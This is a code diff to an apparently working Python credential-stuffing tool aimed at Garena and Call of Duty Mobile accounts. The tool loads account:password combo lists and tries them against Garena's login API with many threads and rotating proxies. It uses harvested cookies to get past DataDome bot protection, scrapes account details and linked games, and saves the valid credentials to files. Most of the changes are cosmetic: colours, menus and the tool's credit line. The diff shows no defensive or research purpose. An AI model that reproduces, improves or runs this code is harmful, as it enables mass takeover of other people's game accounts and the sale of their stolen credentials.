@@ -2380,7 +2348,6 @@ def prelogin(session, account, datadome_manager, cookie_manager, retries=6, prox
         return ('NETWORK_ERROR', None, None)
     return (None, None, None)
 
-
 def login(session, account, password, v1, v2):
     hashed_password = hash_password(password, v1, v2)
     url = 'https://sso.garena.com/api/login'
@@ -2455,11 +2422,9 @@ def login(session, account, password, v1, v2):
                 continue
     return None
 
-
 def _generate_device_id():
     import uuid
     return f'02-{uuid.uuid4()}'
-
 
 def get_codm_grant_code(session):
     for attempt in range(OAUTH_MAX_RETRIES):
@@ -2500,7 +2465,6 @@ def get_codm_grant_code(session):
             return ''
     return ''
 
-
 def token_exchange(code, device_id=None, proxies=None):
     if not device_id:
         device_id = _generate_device_id()
@@ -2538,7 +2502,6 @@ def token_exchange(code, device_id=None, proxies=None):
             return ''
     return ''
 
-
 def get_codm_access_token(session):
     try:
         random_id = str(int(time.time() * 1000))
@@ -2564,7 +2527,6 @@ def get_codm_access_token(session):
     except Exception:
         return ('', '', '')
 
-
 def process_codm_callback(session, access_token, open_id=None, uid=None):
     try:
         old_callback_url = f'https://api-delete-request.codm.garena.co.id/oauth/callback/?access_token={access_token}'
@@ -2588,7 +2550,6 @@ def process_codm_callback(session, access_token, open_id=None, uid=None):
         return (None, 'unknown_error')
     except Exception:
         return (None, 'error')
-
 
 def get_codm_user_info(session, token):
     try:
@@ -2618,7 +2579,6 @@ def get_codm_user_info(session, token):
     except Exception:
         return {}
 
-
 def check_codm_account(session, account):
     codm_info = {}
     has_codm = False
@@ -2637,7 +2597,6 @@ def check_codm_account(session, account):
     except Exception:
         pass
     return (has_codm, codm_info)
-
 
 def parse_account_details(data):
     user_info = data.get('user_info', {})
@@ -2679,7 +2638,6 @@ def parse_account_details(data):
         security_indicators.append('[WARNING] Suspicious')
     account_info['security_status'] = '[SUCCESS] Normal' if not security_indicators else ' | '.join(security_indicators)
     return account_info
-
 
 def display_codm_info(account, password, details, codm_info, has_codm,
                       error_reason=None, game_connections=None, is_elegant=False):
@@ -2804,8 +2762,12 @@ def display_codm_info(account, password, details, codm_info, has_codm,
             _raw_write(card_text + '\n')
             _raw_flush()
 
+
+
 def display_codm_info_elegant(account, password, details, codm_info, has_codm, error_reason=None, game_connections=None):
     display_codm_info(account, password, details, codm_info, has_codm, error_reason, game_connections, is_elegant=True)
+
+
 _auto_remove_queue = []
 _auto_remove_lock = threading.Lock()
 _auto_remove_batch = 50
@@ -2833,95 +2795,11 @@ def _flush_auto_remove(file_manager, combo_file_path, force=False):
     except Exception:
         pass
 
-
 def _queue_auto_remove(account, password, file_manager, combo_file_path):
     with _auto_remove_lock:
         _auto_remove_queue.append(f'{account}:{password}')
     if len(_auto_remove_queue) >= _auto_remove_batch:
         threading.Thread(target=_flush_auto_remove, args=(file_manager, combo_file_path), daemon=True).start()
-
-
-def get_game_connections(session, account):
-    """Fetch Garena game connections for the given account.
-
-    Returns a list of dicts: [{'game': str, 'role': str, 'region': str}, ...]
-    Returns an empty list on any failure (caller treats empty as 'no games').
-    """
-    try:
-        headers = {
-            'accept': 'application/json, text/plain, */*',
-            'referer': 'https://account.garena.com/',
-            'user-agent': ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
-                           'AppleWebKit/537.36 (KHTML, like Gecko) '
-                           'Chrome/129.0.0.0 Safari/537.36'),
-        }
-        cookie_parts = []
-        for k in ('apple_state_key', 'datadome', 'sso_key', 'ac_session', 'session_key'):
-            v = session.cookies.get(k)
-            if v:
-                cookie_parts.append(f'{k}={v}')
-        if cookie_parts:
-            headers['cookie'] = '; '.join(cookie_parts)
-
-        resp = session.get(
-            'https://account.garena.com/api/account/connections',
-            headers=headers, timeout=6,
-        )
-        if resp.status_code != 200:
-            return []
-        try:
-            data = resp.json()
-        except json.JSONDecodeError:
-            return []
-
-        connections = []
-        raw = data.get('connections') or data.get('game_connections') or []
-        if isinstance(raw, list):
-            for item in raw:
-                if not isinstance(item, dict):
-                    continue
-                connections.append({
-                    'game':   item.get('game') or item.get('name') or 'Unknown',
-                    'role':   item.get('role') or item.get('role_name') or 'N/A',
-                    'region': item.get('region') or item.get('country') or 'N/A',
-                })
-        return connections
-    except Exception:
-        return []
-
-
-def save_game_folder(account, password, account_data, game_connections, base_dir):
-    """Persist any non-CODM game connections into per-game txt files.
-
-    Creates a 'Games' subdirectory under base_dir and writes one file per
-    game (using GAME_FILE_MAP for filename mapping). Each line is
-    'account:password | role (region)'. Safe to call when game_connections
-    is empty — it will simply do nothing.
-    """
-    try:
-        if not game_connections:
-            return
-        games_dir = Path(base_dir) / 'Games'
-        games_dir.mkdir(parents=True, exist_ok=True)
-
-        for gc in game_connections:
-            gname = (gc.get('game') or 'Unknown').strip()
-            gname_upper = gname.upper()
-            if gname_upper == 'FREE FIRE':
-                gname_upper = 'FREEFIRE'
-            file_name = GAME_FILE_MAP.get(gname_upper)
-            if not file_name:
-                safe = re.sub(r'[^A-Za-z0-9_-]+', '_', gname).strip('_') or 'Unknown'
-                file_name = f'{safe}.txt'
-
-            role = gc.get('role', 'N/A')
-            region = gc.get('region', 'N/A')
-            line = f'{account}:{password} | {role} ({region})'
-            target = games_dir / file_name
-            with open(target, 'a', encoding='utf-8') as fh:
-                fh.write(line + '\n')
-    except Exception:
-        pass
 
 
 def processaccount(session, account, password, cookie_manager, datadome_manager, live_stats, results_manager, file_manager, combo_file_path, auto_remove, use_elegant_display=False, suppress_print=False, proxy_manager=None):
@@ -3334,7 +3212,6 @@ def processaccount(session, account, password, cookie_manager, datadome_manager,
                 _queue_auto_remove(account, password, file_manager, combo_file_path)
             return 'ERROR'
 
-
 def _prelogin_no_ip_wait(session, account, datadome_manager, max_retries=6):
     url = 'https://sso.garena.com/api/prelogin'
     for attempt in range(max_retries):
@@ -3400,7 +3277,6 @@ def _prelogin_no_ip_wait(session, account, datadome_manager, max_retries=6):
             continue
     return (None, None, None)
 
-
 def validator_check():
     clear_screen()
     display_banner()
@@ -3443,15 +3319,15 @@ def validator_check():
     console.print(Panel(Text(f"Loaded {len(accounts):,} combos", style="bold bright_white"), border_style="bright_green", box=box.ROUNDED, expand=False))
     print()
     
-    console.print(Panel(Text("Select Thread Count", style="bold bright_white"), border_style="cyan", box=box.ROUNDED, expand=False))
+    console.print(Panel(Text("Select Thread Count", style="bold bright_white"), border_style="bright_cyan", box=box.ROUNDED, expand=False))
     
     while True:
         try:
-            raw_t = input(f'  {_CY}❯ Threads 1-100 {_DIM}(default {DEFAULT_THREADS}){_RST}  {_CY}❯{_RST} ').strip()
+            raw_t = input(f'  {_CY}❯ Threads 1-20 {_DIM}(default {DEFAULT_THREADS}){_RST}  {_CY}❯{_RST} ').strip()
             num_threads = int(raw_t) if raw_t else DEFAULT_THREADS
-            if 1 <= num_threads <= 100:
+            if 1 <= num_threads <= 20:
                 break
-            _log('ERROR', 'Enter a value between 1 and 100.')
+            _log('ERROR', 'Enter a value between 1 and 20.')
         except ValueError:
             _log('ERROR', 'Invalid input — enter a number.')
     
@@ -3525,8 +3401,8 @@ def validator_check():
         with print_lock:
             console.print()
             console.print(Panel(
-                f"[cyan]{'█' * filled}{'░' * (bar_w - filled)}[/cyan]  [bold bright_yellow]{pct:.1f}%[/bold bright_yellow]  [dim]{dn}/{total}  ·  {rate:.1f}/s  ·  ETA {int(eta // 60)}m{int(eta % 60):02d}s[/dim]",
-                border_style="cyan", box=box.ROUNDED, padding=(0, 1), expand=False
+                f"[bright_cyan]{'█' * filled}{'░' * (bar_w - filled)}[/bright_cyan]  [bold bright_yellow]{pct:.1f}%[/bold bright_yellow]  [dim]{dn}/{total}  ·  {rate:.1f}/s  ·  ETA {int(eta // 60)}m{int(eta % 60):02d}s[/dim]",
+                border_style="bright_cyan", box=box.ROUNDED, padding=(0, 1), expand=False
             ))
             console.print()
 
@@ -3572,7 +3448,7 @@ def validator_check():
         if done_now % 5 == 0 or done_now == total:
             _print_live_stats()
     
-    console.print(Panel(Text(f"Output: {out_dir}", style="cyan"), border_style="cyan", box=box.ROUNDED, expand=False))
+    console.print(Panel(Text(f"Output: {out_dir}", style="bright_cyan"), border_style="bright_cyan", box=box.ROUNDED, expand=False))
     print()
     
     try:
@@ -3582,7 +3458,7 @@ def validator_check():
                 if stop_ev.is_set():
                     break
                 try:
-                    fut.result(timeout=8)
+                    fut.result(timeout=30)
                 except Exception:
                     pass
     except KeyboardInterrupt:
@@ -3601,7 +3477,7 @@ def validator_check():
         f2 = int(cnt / denom * bw)
         return f"[{color}]{'█' * f2}[/{color}][dim]{'░' * (bw - f2)}[/dim]"
     
-    results_table = Table(title="[bold bright_yellow]⬡  VALIDATOR COMPLETE[/bold bright_yellow]", box=box.ROUNDED, border_style="bright_yellow", show_header=True, header_style="bold dim", padding=(0, 2), expand=False)
+    results_table = Table(title="[bold bright_yellow]⬡  VALIDATOR COMPLETE[/bold bright_yellow]", box=box.HEAVY, border_style="bright_yellow", show_header=True, header_style="bold dim", padding=(0, 2), expand=False)
     results_table.add_column("Category", style="dim", no_wrap=True, width=14)
     results_table.add_column("Count", justify="right", style="bright_white", width=10)
     results_table.add_column("Pct", justify="right", style="bright_yellow", width=8)
@@ -3618,59 +3494,111 @@ def validator_check():
         Text(f"⏱  Time     {int(elapsed // 60)}m {int(elapsed % 60)}s\n", style="dim") +
         Text(f"⚡  Rate     {dn / elapsed:.2f} acc/s\n", style="dim") +
         Text(f"◈  Processed {dn:,}/{total:,}\n", style="dim") +
-        Text(f"✔  Valid    {valid_path}\n", style="cyan") +
-        Text(f"✖  Invalid  {invalid_path}\n", style="cyan") +
-        Text(f"·  Errors   {error_path}\n", style="cyan") +
-        Text("◈  Powered by @dvlist", style="bold cyan"),
-        border_style="bright_cyan", box=box.ROUNDED, expand=False
+        Text(f"✔  Valid    {valid_path}\n", style="bright_cyan") +
+        Text(f"✖  Invalid  {invalid_path}\n", style="bright_cyan") +
+        Text(f"·  Errors   {error_path}\n", style="bright_cyan") +
+        Text("⬡  Powered by @zenix262", style="bold bright_magenta"),
+        border_style="bright_magenta", box=box.ROUNDED, expand=False
     )
     console.print(stats_panel)
     print()
-    input(f'  {_DIM}↵ menu{_RST} ')
+    input(f'  {_DIM}Press Enter to return to menu{_RST} ')
+
+from rich.align import Align
 
 def prompt_proxy_setup():
     global proxy_manager
-    indent = "    "
+    indent = "    "  # Ibinalik natin para hindi mag-error ang mga pauses/inputs sa ibaba
     clear_screen()
     display_banner()
 
     def _header(title, subtitle=None):
+        t_upper = title.upper()
+        s_upper = subtitle.upper() if subtitle else None
+        
+        content_text = Text(t_upper, style="bold bright_white", justify="center")
+        if s_upper:
+            content_text.append(f"\n{s_upper}", style="dim")
+            
         console.print(Panel(
-            Text(title, style="bold bright_white") if not subtitle
-            else Text(title, style="bold bright_white") + Text(f"\n{subtitle}", style="dim"),
-            border_style="bright_yellow", box=box.ROUNDED, expand=False
+            Align.center(content_text),
+            border_style="bright_magenta", box=box.ROUNDED, expand=True
         ))
         print()
 
     def _panel(content, border="bright_cyan"):
-        console.print(Panel(content, border_style=border, box=box.ROUNDED, expand=False))
+        console.print(Panel(Align.center(content), border_style=border, box=box.ROUNDED, expand=True))
         print()
 
-    def _ok(msg):   console.print(indent + f"[bold green]  ✔ {msg}[/bold green]")
-    def _warn(msg): console.print(indent + f"[bold yellow]  ⚠ {msg}[/bold yellow]")
-    def _err(msg):  console.print(indent + f"[bold red]  ✖ {msg}[/bold red]")
-    def _info(msg): console.print(indent + f"  [bold cyan]{msg}[/bold cyan]")
+    def _ok(msg):   console.print(Align.center(f"[bold green]✔ {msg}[/bold green]"))
+    def _warn(msg): console.print(Align.center(f"[bold yellow]⚠ {msg}[/bold yellow]"))
+    def _err(msg):  console.print(Align.center(f"[bold red]✖ {msg}[/bold red]"))
+    def _info(msg): console.print(Align.center(f"[bold bright_cyan]{msg}[/bold bright_cyan]"))
+        
     def _ask(prompt, color="bold bright_cyan"):
-        return console.input(indent + f"[{color}]  ▸ {prompt}[/{color}]").strip()
+        return console.input(Align.center(f"[{color}]❯ {prompt}[/{color}]")).strip()
 
     _header("PROXY CONFIGURATION", "Configure how requests are routed")
 
-    mode_text = (
-        Text("  [1]  ", style="bold bright_cyan") + Text("Custom URL", style="bold white") +
-        Text("   – Single proxy, enter manually\n", style="dim") +
-        Text("  [2]  ", style="bold bright_cyan") + Text("Proxy File", style="bold white") +
-        Text("   – Load multiple proxies from a file\n", style="dim") +
-        Text("  [3]  ", style="bold bright_cyan") + Text("No Proxy  ", style="bold white") +
-        Text("   – Direct connection, no routing", style="dim")
+    _panel(
+        Text("[1]  CUSTOM URL\n", style="bold bright_cyan", justify="center") +
+        Text("– SINGLE PROXY, ENTER MANUALLY", style="dim", justify="center"),
+        border="bright_cyan"
     )
-    _panel(mode_text)
+    
+    _panel(
+        Text("[2]  PROXY FILE\n", style="bold bright_cyan", justify="center") +
+        Text("– LOAD MULTIPLE PROXIES FROM A FILE", style="dim", justify="center"),
+        border="bright_cyan"
+    )
+    
+    _panel(
+        Text("[3] COOKIE/VPN USE\n", style="bold bright_cyan", justify="center") +
+        Text("– DIRECT CONNECTION, NO ROUTING", style="dim", justify="center"),
+        border="bright_cyan"
+    )
 
     while True:
-        choice = _ask("Select mode (1-3): ")
+        choice = _ask("SELECT MODE (1-3): ")
         if choice in ("1", "2", "3"):
             break
-        _err("Invalid choice. Enter 1, 2, or 3.")
+        _err("INVALID CHOICE. ENTER 1, 2, OR 3.")
     print()
+
+    # --- LOGIC HANDLING PER OPTION ---
+    if choice == "1":
+        while True:
+            url = _ask("ENTER PROXY URL (HTTP/SOCKS5): ")
+            if url:
+                try:
+                    proxy_manager = url
+                    _ok(f"CUSTOM PROXY CONFIGURED: {url}")
+                    break
+                except Exception as e:
+                    _err(f"INVALID PROXY URL: {e}")
+            else:
+                _err("URL CANNOT BE EMPTY.")
+        print()
+
+    elif choice == "2":
+        while True:
+            filepath = _ask("ENTER PROXY FILE PATH: ")
+            if filepath:
+                try:
+                    proxy_manager = filepath
+                    _ok(f"LOADED PROXIES FROM {filepath}")
+                    break
+                except Exception as e:
+                    _err(f"FAILED TO LOAD FILE: {e}")
+            else:
+                _err("FILE PATH CANNOT BE EMPTY.")
+        print()
+
+    elif choice == "3":
+        proxy_manager = None
+        _warn("PROXIES DISABLED. RUNNING DIRECT.")
+        print()
+
 
     if choice == "1":
         fmt_text = (
@@ -3798,7 +3726,7 @@ def prompt_proxy_setup():
 
             console.print(
                 indent +
-                f"  [bold cyan]Loaded:[/bold cyan]  "
+                f"  [bold bright_cyan]Loaded:[/bold bright_cyan]  "
                 f"[green]{len(parsed_urls)} proxies[/green]  "
                 f"[dim]│[/dim]  "
                 f"[yellow]{skipped} lines skipped[/yellow]"
@@ -3821,10 +3749,10 @@ def prompt_proxy_setup():
                     print()
                     speed_text = (
                         Text("Select validation speed.\n\n", style="bold bright_white") +
-                        Text("  [1]  ", style="bold cyan") + Text("Turbo   ", style="bold white") + Text("1000 threads, 4s timeout  – fastest, high RAM\n", style="dim") +
-                        Text("  [2]  ", style="bold cyan") + Text("Fast    ", style="bold white") + Text(" 500 threads, 5s timeout  – recommended\n", style="dim") +
-                        Text("  [3]  ", style="bold cyan") + Text("Normal  ", style="bold white") + Text(" 200 threads, 7s timeout  – stable\n", style="dim") +
-                        Text("  [4]  ", style="bold cyan") + Text("Slow    ", style="bold white") + Text("  50 threads, 10s timeout – low-end PC", style="dim")
+                        Text("  [1]  ", style="bold bright_cyan") + Text("Turbo   ", style="bold white") + Text("1000 threads, 4s timeout  – fastest, high RAM\n", style="dim") +
+                        Text("  [2]  ", style="bold bright_cyan") + Text("Fast    ", style="bold white") + Text(" 500 threads, 5s timeout  – recommended\n", style="dim") +
+                        Text("  [3]  ", style="bold bright_cyan") + Text("Normal  ", style="bold white") + Text(" 200 threads, 7s timeout  – stable\n", style="dim") +
+                        Text("  [4]  ", style="bold bright_cyan") + Text("Slow    ", style="bold white") + Text("  50 threads, 10s timeout – low-end PC", style="dim")
                     )
                     _panel(speed_text)
                     speed_choice = _ask("Speed (1-4, Enter = Fast): ")
@@ -3833,7 +3761,7 @@ def prompt_proxy_setup():
 
                     console.print(
                         indent +
-                        f"  [bold cyan]Validating:[/bold cyan]  "
+                        f"  [bold bright_cyan]Validating:[/bold bright_cyan]  "
                         f"[yellow]{len(parsed_urls):,} proxies[/yellow]  "
                         f"[dim]│[/dim]  [cyan]{workers} threads[/cyan]  "
                         f"[dim]│  {timeout}s timeout[/dim]"
@@ -3922,7 +3850,7 @@ def _close_check_session() -> None:
             pass
         del _proxy_check_local.session
 
-def _parse_proxy_line(raw: str) -> Optional[str]:
+def _parse_proxy_line(raw: str) -> str | None:
     raw = raw.strip()
     if not raw or raw.startswith("#"):
         return None
@@ -3947,7 +3875,7 @@ def _parse_proxy_line(raw: str) -> Optional[str]:
         return f"http://{urllib.parse.quote(user, safe='-._~')}:{urllib.parse.quote(pw, safe='-._~')}@{host}:{port}"
     return None
 
-def _validate_proxy(url: str, timeout: float = 5.0) -> Tuple[bool, str, float]:
+def _validate_proxy(url: str, timeout: float = 5.0) -> tuple[bool, str, float]:
     try:
         parsed = urllib.parse.urlparse(url)
         proxy_host = parsed.hostname or ""
@@ -4146,7 +4074,9 @@ def _display_proxy_quality(valid_count, total_count, avg_latency_ms, indent="   
     ))
     console.print()
 
-def _validate_proxies_bulk(urls: List[str], timeout: float = 5.0, max_workers: int = 500, indent: str = "    ") -> List[str]:
+
+
+def _validate_proxies_bulk(urls: list[str], timeout: float = 5.0, max_workers: int = 500, indent: str = "    ") -> list[str]:
     total = len(urls)
     workers = min(max_workers, max(total, 1))
     valid = []
@@ -4157,7 +4087,7 @@ def _validate_proxies_bulk(urls: List[str], timeout: float = 5.0, max_workers: i
 
     progress = Progress(
         SpinnerColumn(),
-        TextColumn("[bold cyan]Validating"),
+        TextColumn("[bold bright_cyan]Validating"),
         BarColumn(bar_width=30),
         TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
         MofNCompleteColumn(),
@@ -4309,6 +4239,8 @@ def _display_final_summary(live_stats: 'LiveStats', label: str = 'SESSION COMPLE
         console.print(Padding(games_panel, (0, 0, 0, 4)))
 
     console.print(Padding(Text.from_markup("[cyan]◈  Powered by @dvlist[/cyan]"), (1, 0, 1, 6)))
+
+
 
 
 def bulk_check(bulk_mode: str = 'full'):
@@ -4747,6 +4679,8 @@ def bulk_check(bulk_mode: str = 'full'):
     print()
     input(f'  {_DIM}↵ menu{_RST} ')
 
+
+
 def single_check():
     clear_screen()
     display_banner()
@@ -4876,6 +4810,8 @@ def single_check():
         ))
         print()
 
+
+
 def _probe_proxy_chain(proxy_url, timeout=15.0):
     import ssl as _ssl
     try:
@@ -4973,7 +4909,7 @@ def proxy_diagnostic():
     console.print(Panel(
         Text("PROXY DIAGNOSTIC", style="bold bright_white") +
         Text("\nHTTP CONNECT + TLS probe to sso.garena.com:443", style="dim"),
-        border_style="bright_cyan", box=box.ROUNDED, expand=False
+        border_style="bright_magenta", box=box.ROUNDED, expand=False
     ))
     print()
 
@@ -5025,7 +4961,7 @@ def proxy_diagnostic():
         Text(f"✖  Failed      {fail_count:,}\n", style="bold bright_red") +
         Text(f"◈  Total       {len(results):,}\n", style="dim"),
         title="[bold bright_yellow]DIAGNOSTIC COMPLETE[/bold bright_yellow]",
-        border_style="bright_yellow", box=box.ROUNDED, expand=False
+        border_style="bright_yellow", box=box.HEAVY, expand=False
     ))
     print()
 
@@ -5047,7 +4983,7 @@ def proxy_diagnostic():
     else:
         _log('SUCCESS', f"{ok_count} proxies look usable for Garena auth.")
     print()
-    input(f'  {_DIM}↵ menu{_RST} ')
+    input(f'  {_DIM}Press Enter to return to menu{_RST} ')
 
 
 def display_main_menu():
@@ -5100,8 +5036,13 @@ def display_main_menu():
         except KeyboardInterrupt:
             return '4'
 
+
+
 def clear_screen():
     os.system('cls' if os.name == 'nt' else 'clear')
+
+
+
 
 def display_banner():
     """Render the Hesu banner — ASCII art with bright gradient + header bar."""
@@ -5160,6 +5101,244 @@ def display_banner():
     print(sep)
     print()
 
+
+
+
+def display_main_menu():
+    R    = '\033[0m'
+    GOLD = '\033[96m'    # cyan     — CHECKER
+    TEAL = '\033[92m'    # green    — TOOLS
+    PINK = '\033[95m'   # purple   — GENERATORS
+    W    = '\033[1;97m'
+    DM   = '\033[2m'
+
+    tw = _tw()
+    w  = min(tw - 4, 76)
+    sep = f'  \033[90m{"─" * w}{R}'
+
+    def _sec(title, c):
+        print(f'  {c}│{R} {c}{title}{R}')
+
+    def _item(n, label, desc, c):
+        print(f'    {c}▸{R} {W}{n:>2}{R}  {W}{label:<18s}{R}  {DM}{desc}{R}')
+
+    print()
+    _sec('CHECKER', GOLD)
+    _item(1,  'Full Info',       'Complete account details',        GOLD)
+    _item(2,  'Semi Info',       'Level · Clean · Shell · Country',  GOLD)
+    _item(3,  'No Info',         'Fastest — Valid / Invalid only',   GOLD)
+    _item(4,  'Single Check',    'One account, full output',         GOLD)
+    print()
+    _sec('TOOLS', TEAL)
+    _item(5,  'Log Separator',   'Separates logs by domain',         TEAL)
+    _item(6,  'File Splitter',   'Split lines into multiple files',  TEAL)
+    _item(7,  'File Merger',     'Merge multiple files into one',    TEAL)
+    _item(8,  'Watermark Detect','Detects if logs are leaked',       TEAL)
+    _item(9,  'Encryption',      'Encrypt your code',                TEAL)
+    print()
+    _sec('GENERATORS', PINK)
+    _item(10, 'CN31 Generator',  'Fresh cn31 for ML Checker',        PINK)
+    _item(11, 'CODM Generator',  'Valid lines for CODM',             PINK)
+    _item(12, 'MLBB Generator',  'Valid lines for MLBB',             PINK)
+    print()
+    print(sep)
+    print(f'  {GOLD}◆{R} {GOLD}@dvlist{R}')
+    print()
+
+    while True:
+        try:
+            choice = input(f'  {TEAL}▸{R} Select [1-12]: ').strip()
+            if choice in ('1','2','3','4','5','6','7','8','9','10','11','12'):
+                return choice
+            _log('ERROR', 'Enter 1-12.', '    ')
+        except KeyboardInterrupt:
+            return '4'
+
+
+
+
+
+def main():
+    cookie_manager = CookieManager()
+    n_cookies = len(cookie_manager.live_cookies)
+    display_banner()
+    if n_cookies > 0:
+        _log('SUCCESS', f'Fresh cookies loaded: {n_cookies:,} — unli mode active')
+    else:
+        _log('WARNING', 'No fresh_cookie.txt — will auto-fetch DataDome cookies on demand')
+    print()
+    time.sleep(0.5)
+
+    while True:
+        clear_screen()
+        display_banner()
+        choice = display_main_menu()
+        if choice == '1':
+            bulk_check(bulk_mode='full')
+        elif choice == '2':
+            bulk_check(bulk_mode='semi')
+        elif choice == '3':
+            bulk_check(bulk_mode='none')
+        elif choice == '4':
+            single_check()
+        elif choice == '6':
+            file_splitter()
+        elif choice == '7':
+            file_merger()
+        elif choice == '8':
+            detect_watermark()
+        elif choice == '9':
+            high_security_encryption()
+        elif choice == '10':
+            generate_cn31()
+        elif choice == '11':
+            generate_codm()
+        elif choice == '12':
+            generate_mlbb()
+        elif choice == '5':
+            print(f'\n  {_YL}⚠  Tool under construction.{_RST}')
+            input(f'\n  {_DIM}↵ menu{_RST} ')
+
+
+
+
+# ─── UI / dashboard additions from His checker.py ──────────────────────────
+
+
+def _prompt_box(body, title, border='bright_cyan', title_color=None,
+                box_style=None, indent=2):
+    """Rich Panel prompt — soft rounded/heavy box with per-section border color."""
+    from rich.panel import Panel
+    from rich.padding import Padding
+    from rich import box as _box
+    bs = box_style if box_style is not None else _box.ROUNDED
+    tc = title_color or border
+    console.print(Padding(
+        Panel(body,
+              title=f'[bold {tc}]{title}[/bold {tc}]',
+              border_style=border, box=bs, expand=False),
+        (0, 0, 0, indent)
+    ))
+
+
+def _raw_write(s: str):
+    """Write directly to the real terminal, bypassing colorama's wrapper.
+
+    colorama.init(autoreset=True) wraps sys.stdout with a StreamWrapper
+    that intercepts ANSI escape sequences. This is fine for color codes,
+    but it strips/breaks cursor-control and scroll-region sequences
+    (\x1b[1;Nr, \x1b[N;1H, \x1b[0J, etc.).
+
+    For terminal control sequences, we must write to the underlying stream.
+    """
+    stream = getattr(sys.stdout, '_StreamWrapper__wrapped', None)
+    if stream is None:
+        stream = getattr(sys.stdout, 'stream', None)
+    if stream is None:
+        stream = sys.stdout
+    try:
+        stream.write(s)
+    except Exception:
+        try:
+            sys.__stdout__.write(s)
+        except Exception:
+            pass
+
+
+def _raw_flush():
+    """Flush the underlying stream (bypassing colorama)."""
+    stream = getattr(sys.stdout, '_StreamWrapper__wrapped', None)
+    if stream is None:
+        stream = getattr(sys.stdout, 'stream', None)
+    if stream is None:
+        stream = sys.stdout
+    try:
+        stream.flush()
+    except Exception:
+        pass
+
+
+def get_game_connections(session, account):
+    """Fetch Garena game connections for the given account.
+
+    Returns a list of dicts: [{'game': str, 'role': str, 'region': str}, ...]
+    Returns an empty list on any failure (caller treats empty as 'no games').
+    """
+    try:
+        headers = {
+            'accept': 'application/json, text/plain, */*',
+            'referer': 'https://account.garena.com/',
+            'user-agent': ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
+                           'AppleWebKit/537.36 (KHTML, like Gecko) '
+                           'Chrome/129.0.0.0 Safari/537.36'),
+        }
+        cookie_parts = []
+        for k in ('apple_state_key', 'datadome', 'sso_key', 'ac_session', 'session_key'):
+            v = session.cookies.get(k)
+            if v:
+                cookie_parts.append(f'{k}={v}')
+        if cookie_parts:
+            headers['cookie'] = '; '.join(cookie_parts)
+
+        resp = session.get(
+            'https://account.garena.com/api/account/connections',
+            headers=headers, timeout=6,
+        )
+        if resp.status_code != 200:
+            return []
+        try:
+            data = resp.json()
+        except json.JSONDecodeError:
+            return []
+
+        connections = []
+        raw = data.get('connections') or data.get('game_connections') or []
+        if isinstance(raw, list):
+            for item in raw:
+                if not isinstance(item, dict):
+                    continue
+                connections.append({
+                    'game':   item.get('game') or item.get('name') or 'Unknown',
+                    'role':   item.get('role') or item.get('role_name') or 'N/A',
+                    'region': item.get('region') or item.get('country') or 'N/A',
+                })
+        return connections
+    except Exception:
+        return []
+
+
+def save_game_folder(account, password, account_data, game_connections, base_dir):
+    """Persist any non-CODM game connections into per-game txt files.
+
+    Creates a 'Games' subdirectory under base_dir and writes one file per
+    game (using GAME_FILE_MAP for filename mapping). Each line is
+    'account:password | role (region)'. Safe to call when game_connections
+    is empty — it will simply do nothing.
+    """
+    try:
+        if not game_connections:
+            return
+        games_dir = Path(base_dir) / 'Games'
+        games_dir.mkdir(parents=True, exist_ok=True)
+
+        for gc in game_connections:
+            gname = (gc.get('game') or 'Unknown').strip()
+            gname_upper = gname.upper()
+            if gname_upper == 'FREE FIRE':
+                gname_upper = 'FREEFIRE'
+            file_name = GAME_FILE_MAP.get(gname_upper)
+            if not file_name:
+                safe = re.sub(r'[^A-Za-z0-9_-]+', '_', gname).strip('_') or 'Unknown'
+                file_name = f'{safe}.txt'
+
+            role = gc.get('role', 'N/A')
+            region = gc.get('region', 'N/A')
+            line = f'{account}:{password} | {role} ({region})'
+            target = games_dir / file_name
+            with open(target, 'a', encoding='utf-8') as fh:
+                fh.write(line + '\n')
+    except Exception:
+        pass
 
 
 def generate_cn31():
@@ -5719,46 +5898,6 @@ def detect_watermark():
 
     input(f'\n  {_DIM}[Press Enter to return to menu]{_RST} ')
 
-def main():
-    cookie_manager = CookieManager()
-    n_cookies = len(cookie_manager.live_cookies)
-    display_banner()
-    if n_cookies > 0:
-        _log('SUCCESS', f'Fresh cookies loaded: {n_cookies:,} — unli mode active')
-    else:
-        _log('WARNING', 'No fresh_cookie.txt — will auto-fetch DataDome cookies on demand')
-    print()
-    time.sleep(0.5)
-
-    while True:
-        clear_screen()
-        display_banner()
-        choice = display_main_menu()
-        if choice == '1':
-            bulk_check(bulk_mode='full')
-        elif choice == '2':
-            bulk_check(bulk_mode='semi')
-        elif choice == '3':
-            bulk_check(bulk_mode='none')
-        elif choice == '4':
-            single_check()
-        elif choice == '6':
-            file_splitter()
-        elif choice == '7':
-            file_merger()
-        elif choice == '8':
-            detect_watermark()
-        elif choice == '9':
-            high_security_encryption()
-        elif choice == '10':
-            generate_cn31()
-        elif choice == '11':
-            generate_codm()
-        elif choice == '12':
-            generate_mlbb()
-        elif choice == '5':
-            print(f'\n  {_YL}⚠  Tool under construction.{_RST}')
-            input(f'\n  {_DIM}↵ menu{_RST} ')
 
 if __name__ == '__main__':
     try:
